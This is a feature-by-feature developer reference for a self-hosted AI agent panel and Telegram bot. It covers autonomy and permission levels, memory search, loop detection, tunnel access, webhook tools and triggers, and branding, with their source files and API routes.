- **Autonomy levels** (`src/core/mainSettings.ts`): four levels — `supervised` (all tools prompt), `standard` (read-only auto, risky prompt; default), `full` (`bypassPermissions`), `auto_until_error`. `auto_until_error` auto-approves the safe+trusted write set (Bash/Write/Edit/NotebookEdit) until a tool errors, then opens a 3-call supervised cooldown. Escalation state is transient (not persisted), reset each turn. Per-chat interactive only, not for workers.
- **Personas and language** (`src/core/mainSettings.ts`, `src/core/languages.ts`): optional `persona` (character/tone) and `defaultLanguage` (BCP 47, 30-language catalogue) per agent. `/lang <code>` per-chat override. Both fold into `prompt.ts`.
- **Plan and usage** (`src/core/planSettings.ts`, `src/core/usageProbe.ts`, `src/core/claudeUsage.ts`): subscription plan config, live limit probing from Anthropic OAuth endpoints (Keychain token), historical stats from `~/.claude/stats-cache.json`.
- **Semantic memory** (`src/core/embeddings.ts`): auto-probe mode (`_auto`) probes Ollama (`:11434`) then LM Studio (`:1234`) on boot and enables whichever is live. Explicit `EMBEDDING_ENABLED=on|off` locks the choice. Leaving auto mode requires a panel action (`setEmbeddingsEnabled(..., auto=false)`). See Memory bullet above for recall/ranking details. **Generic hybrid search** (`src/core/semanticSearch.ts`): `semanticSearch(items, query, limit)` ranks any `{id, text}` set by the same cosine 0.7 + keyword 0.3 blend memory uses, embedding the candidate set on demand (vectors not persisted — few enough cards/skills) and degrading to keyword-only when embeddings are off/unreachable. Backs the `mcp__tasks__task_search` and `mcp__skills__skill_search` tools (both in `AUTO_ALLOWED_TOOLS`), so agents can find existing cards/skills by meaning before creating duplicates.
- **Session resume after restart** (`src/telegram/resumePrompt.ts`): first turn per chat per process with a rehydrated `sessionId` offers an inline resume-or-fresh prompt (auto-resumes after 10s). Autonomous turns call `markSeen` to skip the offer. **Stale session auto-recovery**: a shared `isStaleSession(err)` helper (`src/claude/runner.ts`) detects the CLI's "No conversation found" rejection; `bot.ts`, `leadBot.ts`, and `agentChat.ts` each drop the invalid `sessionId` and automatically re-run the same prompt as a fresh turn instead of requiring a manual `/new`.
- **Task columns** (`src/core/columnConfig.ts`): user-defined Kanban columns (default `backlog`/`doing`/`done`) with optional WIP limits. Routes `GET|POST /api/tasks/columns`, `PUT|DELETE /api/tasks/columns/:id`.
- **Agentic loop detection** (`src/core/loopDetector.ts` + `src/telegram/loopPrompt.ts`): per-turn `LoopDetector` SHA-256-hashes `(tool + input)` and counts repeats. At `LOOP_THRESHOLD` (default 3): interactive turns post Skip/Approve-once/Continue; `full`-autonomy turns notify and abort via `session.abort`. `LOOP_THRESHOLD=0` disables.
- **Auto skill extraction** (`src/core/autoSkill.ts`): `AUTO_SKILL_GENERATION=true` enables an async Haiku pass after expensive turns to propose a skill entry.
- **Panel terminal** (`src/core/ptyManager.ts`): real PTY shell over `/ws`. Off by default (`PANEL_TERMINAL_ENABLED`). When enabled, shell gets a minimal sanitized env (PATH/HOME/USER/SHELL/TERM/LANG only); `PANEL_TERMINAL_INHERIT_ENV=true` restores full env (risky). Warning logged when terminal is on and `PANEL_HOST` is non-loopback.
- **In-panel updates**: check, apply, and roll back versions mirroring `scripts/update.sh`. Routes `GET /api/update`, `POST /api/update/check|run|restore`.
- **Remote access / tunnel relay** (`src/core/tunnelManager.ts`): spawns ngrok or cloudflared as a child process, scrapes the public URL from stdout, broadcasts state via WS. Off by default (`PANEL_TUNNEL_ENABLED`). HTTP Basic Auth gate (default on, auto-generated password stored in vault, DM'd to allowed users) applies only to tunnel traffic (detected via `x-forwarded-for`/`x-forwarded-host`). Authtoken passed via env, never argv. Auto-start on boot when `autoStart` is set.
- **Per-agent chat** (`src/core/agentChat.ts`): in-panel interactive chat with a specific worker/Lead, own resume token + cwd, streams as `{type:"agent-chat", id, event}`.
- **Per-agent usage** (`src/core/agentUsage.ts`): cost + tokens attributed per agent and daily-by-role. `GET /api/usage/agents`.
- **Feedback relay** (`POST /api/feedback`): relays `{kind, message, email?}` to `FEEDBACK_URL` with deployment context.
- **Connection resilience**: SPA shows a sticky banner on WS/REST outage and auto-reloads on recovery.
- **Setup view** (`/api/me`): read-only deployment facts (version, panel config, tunnel/terminal enabled). Intentionally not editable from the panel.
- **Branding** (`ATLAS_NAME`, `BRAND_NAME`): rename the main agent and product for self-hosted deployments. **White-label** (`src/core/branding.ts`, `branding.json`): a fuller override surface (panel title, logo, favicon, colours, email footer, custom CSS) via `GET|PUT /api/branding`. Free to use — `effectiveBranding()` applies saved values immediately (folding into `/api/me`), env-default names as fallback; `POST /api/branding/reset` wipes it. The `customCss` field is injected as a `<style>` tag by the SPA (`panel/src/lib/branding.ts`, via `textContent`, size-capped) — meant for overriding the theme's CSS custom properties (`--accent`, `--surface`, …) — and `POST /api/branding/generate-css` drafts one from a plain-language description via a one-shot Haiku call (`generateThemeCss()`, same SDK-query pattern as memory maintenance; returned for review, never auto-saved).
- **Daily digest** (`src/core/digest.ts`): `gatherDigest()` is pure data gathering — tasks completed, runs ok/errored, memories written, skills saved, cost — over the last 24h. The `/digest` Telegram command formats it; no telegraf coupling in the core.
- **Generic outbound webhook tools** (`src/core/webhookTools.ts` + `src/mcp/webhookMcp.ts`): user-registered HTTP endpoints (`webhookTools.json`) each surface as a `webhook_<slug>_<id>` MCP tool. Requests go through SSRF-guarded `safeFetch`; static headers may hold `vault:<id>` refs. Managed via `GET|POST /api/webhook-tools`, `PUT|DELETE /api/webhook-tools/:id`. The INBOUND counterpart is **webhook triggers** (`src/core/webhookTriggers.ts`): a public `POST /hook/:id` authenticated by HMAC-SHA256 over the raw body files a backlog card and delegates it (reusing the full delegation/transcript/retry path), appending the inbound payload to the prompt. Rejects replays of an already-accepted signature within a 10-minute window, since each accepted delivery spawns an autonomous `bypassPermissions` run and an observed signed request could otherwise be re-fired repeatedly. Managed via `/api/webhook-triggers*`.
- **Conversation search** (`src/core/conversationSearch.ts`): unifies the live chat history (`chatBridge.history()`) and on-disk run transcripts into one corpus, ranked by the shared hybrid `semanticSearch`. Route `GET /api/conversations/search`.
- **Multi-device presence** (`src/panel/hub.ts` + `panel/src/lib/usePresence.ts`): the WebSocket hub tracks connected panel clients and broadcasts presence so the SPA can show a multi-device banner.
- **Playbook drift** (`src/core/playbook.ts`): the Prompt view flags whether the live `work.md` is the untouched shipped default or has drifted; `restorePlaybook()` (`POST /api/prompt/restore`) resets it to the default template.

The panel REST surface is catalogued (with `curl` examples) in `PANEL_API.md`. `work.md` keeps only a short pointer — the full catalogue is deliberately **not** in `work.md` because it is injected into the system prompt every turn. Keep `PANEL_API.md` and the README in sync when adding or renaming routes.
